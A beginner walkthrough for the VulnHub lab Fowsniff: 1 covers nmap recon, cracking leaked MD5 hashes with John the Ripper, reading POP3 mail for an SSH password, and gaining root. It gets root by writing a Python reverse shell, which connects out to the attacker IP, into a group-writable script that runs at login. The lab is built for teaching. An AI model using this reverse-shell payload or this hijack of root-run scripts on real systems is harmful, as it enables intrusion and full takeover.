# Fowsniff: 1 — VulnHub Walkthrough (Beginner Friendly)

A step-by-step, beginner-friendly walkthrough for the VulnHub machine **"Fowsniff: 1"** by berzerk0. This box demonstrates OSINT/password leaks, POP3 mail enumeration, credential reuse, and privilege escalation via a writable MOTD script.

| Metadata | Value |
| --- | --- |
| **Machine** | Fowsniff: 1 |
| **Author** | berzerk0 |
| **Platform** | VulnHub (VirtualBox OVA) |
| **Difficulty** | Easy (Beginner) |
| **Focus Areas** | OSINT (password leak), MD5 cracking, POP3, SSH, Privilege Escalation |
| **Target IP (Example)** | `192.168.56.101` |

> **Note:** Your target IP may differ depending on your network (NAT/Host-Only). Replace `192.168.56.101` with your machine's IP throughout this walkthrough.

---

## 0. Learning Objectives

By completing this lab, you'll learn:

- How to perform reconnaissance and enumeration on a Linux target.
- How a real-world password leak (Pastebin/Twitter leak) can be used for initial access (OSINT).
- How to crack MD5 password hashes using John the Ripper and wordlists.
- How to enumerate email via POP3 (`nc`, manual commands) and extract credentials.
- How to identify privilege escalation vectors (writable files, group permissions).
- How MOTD (`/etc/update-motd.d/`) scripts run as root on SSH login.
- How to safely document findings for educational purposes.

> **Why it works:** Fowsniff Corp's credentials were leaked in the wild (MD5 hashes posted publicly). The POP3 service was left open, allowing reuse of cracked passwords to read internal emails which revealed a shared SSH temporary password. A script executed by root on SSH login (`/opt/cube/cube.sh` via MOTD) was writable by the `users` group, allowing privilege escalation to root.

---

## 1. Reconnaissance

First, discover the target machine's IP address on your local lab network.

### 1.1 Check your IP/interface
```bash
ip a
```
> **Why it works:** Identifies your attack machine's network range (e.g., `192.168.56.0/24` or `192.168.1.0/24`) to scan for the target.

### 1.2 ARP scan (quick host discovery)
```bash
arp-scan -l
```
> **Why it works:** Lists live hosts on the local subnet. Look for a new Linux host (Fowsniff).

### 1.3 Ping sweep (optional)
```bash
nmap -sn 192.168.56.0/24
```
> **Why it works:** Discovers live hosts. Replace the subnet with yours from step 1.1. Identify the target IP (e.g., `192.168.56.101`).

> **Expected:** Find target IP `192.168.56.101`. We'll use this throughout.

---

## 2. Enumeration

Now scan for open services and explore the web server.

### 2.1 Full port/service scan
```bash
nmap -p- -sC -sV 192.168.56.101
```
> **Why it works:** Scans all TCP ports (`-p-`), runs default scripts (`-sC`) for service enumeration, and versions services (`-sV`). Gives a complete picture.

**Realistic Expected Output:**
```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-13 03:30 IST
Nmap scan report for 192.168.56.101
Host is up (0.00041s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Key services identified:**
> - `22/SSH` — Remote shell access
> - `80/HTTP` — Apache web server (homepage references Fowsniff Corp breach)
> - `110/POP3` — Post Office Protocol v3 (email retrieval)
> - `143/IMAP` — Internet Message Access Protocol (email access)

> **Why POP3/IMAP matter:** Email protocols that can be used to retrieve internal mail if credentials are valid. The breach leak targets mailbox access.

### 2.2 Explore the Web (Port 80)

Open `http://192.168.56.101` in a browser.

- The homepage is a simple Fowsniff Corp page and references a breach/tweet from `@fowsniffcorp`.
- No obvious exploitable links or login forms are visible on the surface.
- Common next step: search for "Fowsniff Corp" breach info (OSINT).

![Homepage](images/01-homepage.png)
*Placeholder: Homepage of Fowsniff Corp (port 80)*

---

## 3. Cracking the Leak (OSINT + John the Ripper)

### 3.1 Find the leaked hash dump

The canonical leak (from community sources) contains MD5 hashes of employee email passwords:

```text
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

> **Why it works:** MD5 is unsalted/fast to crack with a wordlist. The dump gives us usernames + hashes to attack via offline cracking.

Save to files on your attacker machine:

```bash
cat > fowsniff_hashes.txt << 'EOF'
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
EOF
cut -d':' -f2 fowsniff_hashes.txt > hashes.txt
cut -d'@' -f1 fowsniff_hashes.txt > users.txt
```

### 3.2 Crack MD5 hashes with John the Ripper

```bash
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked (8/9):**
```text
scoobydoo2       (seina@fowsniff)
orlando12        (parede@fowsniff)
apples01         (tegel@fowsniff)
skyler22         (baksteen@fowsniff)
mailcall         (mauer@fowsniff)
07011972         (sciana@fowsniff)
carp4ever        (mursten@fowsniff)
bilbo101         (mustikka@fowsniff)
```

Show results:
```bash
john --format=raw-md5 --show hashes.txt
```

![John Cracking](images/02-john-crack.png)
*Placeholder: John the Ripper cracking MD5 hashes*

---

## 4. Foothold (POP3 → SSH)

### 4.1 Read emails via POP3

Connect with netcat:
```bash
nc 192.168.56.101 110
```

Login:
```text
USER seina
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
```

**RETR 1 excerpt:**
```text
Subject: URGENT! Security EVENT!
...
The temporary password for SSH is "S1ck3nBluff+secureshell"
...
```

> **Why it works:** Internal mail reveals the shared SSH temp password.

![POP3 Access](images/03-pop3-access.png)
*Placeholder: Reading mail via POP3*

### 4.2 SSH into the box

```bash
ssh baksteen@192.168.56.101
# Password: S1ck3nBluff+secureshell
```

Check identity:
```bash
id
# uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```

> User is in `users` group — key for privesc.

![SSH Login](images/04-ssh-login.png)
*Placeholder: SSH as baksteen showing MOTD*

---

## 5. Privilege Escalation

### 5.1 Find files owned by group `users`

```bash
find / -group users -type f 2>/dev/null
```

Focus on `/opt/cube/cube.sh`.

### 5.2 Inspect cube.sh and MOTD trigger

```bash
cat /opt/cube/cube.sh
cat /etc/update-motd.d/00-header
```

> **Why it works:** `00-header` runs `sh /opt/cube/cube.sh` as root during SSH login. `cube.sh` is writable by group `users`.

### 5.3 Inject reverse shell

Replace `192.168.56.10` with your attacker IP:
```bash
cat > /opt/cube/cube.sh << 'EOF'
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF
chmod +x /opt/cube/cube.sh
```

### 5.4 Trigger and receive root shell

Attacker:
```bash
nc -lvnp 4444
```

Trigger:
```bash
ssh baksteen@192.168.56.101
# login again
```

On listener:
```text
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

![Root Shell](images/05-root-shell.png)
*Placeholder: Root reverse shell*

### 5.5 Get flag

```bash
cat /root/root.txt
```

![Root Flag](images/06-root-flag.png)
*Placeholder: Root flag*

---

## 6. Summary

| Phase | Action | Result |
|---|---|---|
| **Recon** | `nmap -p- -sC -sV` | SSH(22), HTTP(80), POP3(110), IMAP(143) |
| **OSINT/Crack** | Leak + `john --format=raw-md5` | 8 creds cracked (e.g., `seina:scoobydoo2`) |
| **Foothold** | POP3 RETR 1 | SSH temp: `S1ck3nBluff+secureshell` |
| **Access** | SSH as `baksteen` | Non-root, in `users` group |
| **Privesc** | Writable `/opt/cube/cube.sh` via MOTD | Inject reverse shell → **root** |
| **Flag** | `cat /root/root.txt` | Complete |

**Exploit Chain:** Leak → Crack MD5 → POP3 → Email creds → SSH → Writable MOTD script (`/opt/cube/cube.sh`) → Root.

---

## 7. Defensive Lessons

- Never use unsalted MD5 for passwords.
- Restrict external exposure of mail services (POP3/IMAP).
- Enforce unique, strong passwords; rotate shared/temp creds.
- Avoid group-writable root-owned scripts (especially those run at login).
- Harden MOTD: validate ownership/permissions.
- Patch legacy authentication systems.

---

## 8. References

- [Fowsniff: 1 — VulnHub](https://vulnhub.com/entry/fowsniff-1,262/)
- [Fowsniff: 1 Walkthrough — Hacking Articles](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/)
- [Fowsniff CTF Walkthrough — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/fowsniff-ctf-walkthrough/)
- [Fowsniff Writeup — StrongShiv8](https://strongshiv8.github.io/posts/Fowsniff-CTF/)
- [TryHackMe Fowsniff — Chaudhary1337](https://chaudhary1337.github.io/p/tryhackme-fowsniff-ctf-writeup/)
- [Fowsniff CTF — Ligniform](https://ligniform.blog/posts/fowsniff-ctf-writeup/)

---

## 9. Screenshot Checklist

- [ ] `01-homepage.png` — Webpage at `http://192.168.56.101`
- [ ] `02-john-crack.png` — John cracking MD5 hashes
- [ ] `03-pop3-access.png` — POP3 mail access
- [ ] `04-ssh-login.png` — SSH as `baksteen`
- [ ] `05-root-shell.png` — Root reverse shell
- [ ] `06-root-flag.png` — Root flag